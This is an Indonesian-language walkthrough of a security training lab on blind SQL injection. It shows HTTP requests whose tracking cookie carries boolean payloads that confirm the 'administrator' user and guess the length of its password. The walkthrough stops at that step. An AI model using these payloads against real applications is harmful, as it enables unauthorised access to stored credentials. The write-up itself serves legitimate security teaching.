Apa itu injeksi SQL buta?
Injeksi SQL buta terjadi ketika sebuah aplikasi rentan terhadap injeksi SQL, tetapi respons HTTP-nya tidak berisi hasil kueri 
SQL yang relevan atau detail kesalahan basis data apa pun.
Banyak teknik seperti UNIONserangan tidak efektif terhadap kerentanan injeksi SQL buta. Hal ini karena teknik tersebut 
bergantung pada kemampuan untuk melihat hasil kueri yang disuntikkan 
dalam respons aplikasi. Meskipun masih dimungkinkan untuk mengeksploitasi injeksi SQL buta untuk mengakses data yang tidak sah, teknik yang digunakan harus berbeda
GET /filter?category=Gifts HTTP/2
Host: 0a88002504d7156581fd39d9008a0037.web-security-academy.net
Cookie: TrackingId=7fKDQNwonRoIkWHO' AND 1=1--; session=iMWdUsrezkYSxLA47r7wBJXjFvQknrai
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a88002504d7156581fd39d9008a0037.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


1=1
<img width="1551" height="655" alt="image" src="https://github.com/user-attachments/assets/151fa0ef-db0b-4014-8223-80c40627b047" />



1=2
<img width="1536" height="915" alt="image" src="https://github.com/user-attachments/assets/5e335f66-7d70-435d-9442-28ced8cb4662" />
Cookie: TrackingId=7fKDQNwonRoIkWHO' AND 1=2--; session=iMWdUsrezkYSxLA47r7wBJXjFvQknrai

' AND (SELECT 'x' FROM users WHERE username='administrator')='x'-- x # Aksi: Blok mantra tersebut, lalu tekan Ctrl + U, kemudian klik Send.

Artinya: "Wahai database, apakah ada tabel bernama users yang memiliki pengguna bernama administrator?

<img width="1522" height="619" alt="image" src="https://github.com/user-attachments/assets/5e307a03-6969-4ea3-beef-bfba7d006b81" />
Cookie: TrackingId=7fKDQNwonRoIkWHO'+AND+(SELECT+'x'+FROM+users+WHERE+username%3d'administrator')%3d'x'--+x%3b+session%3diMWdUsrezkYSxLA47r7wBJXjFvQknrai


Langkah 2: Cari Tahu Berapa Panjang Karakter Password-nya
Kita tahu password admin di lab ini berupa string acak, tapi berapa huruf panjangnya? Mari kita tebak menggunakan fungsi LENGTH(). Masukkan perintah ini:
TrackingId=7fKDQNwonRoIkWHO' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20-- x
Aksi: Blok, Ctrl + U, lalu Send.

Cara Menebaknya: Coba ganti angka 20 di paling ujung dengan angka lain (misal: 18, 19, 20, 21) secara bergantian.

Hasilnya: Ketika kamu menembak angka yang salah, tulisan "Welcome back!" akan hilang. Tapi begitu kamu menebak angka yang tepat (petunjuk: di lab ini biasanya panjangnya 20), tulisan "Welcome back!" akan muncul kembali! Catat angka tersebut!

<img width="1536" height="805" alt="image" src="https://github.com/user-attachments/assets/c76b49fc-e2a5-481b-a1cb-dc796a8f7744" />
Cookie: TrackingId=7fKDQNwonRoIkWHO'+AND+(SELECT+LENGTH(password)+FROM+users+WHERE+username%3d'administrator')%3d20--+x%3b+session%3diMWdUsrezkYSxLA47r7wBJXjFvQknrai


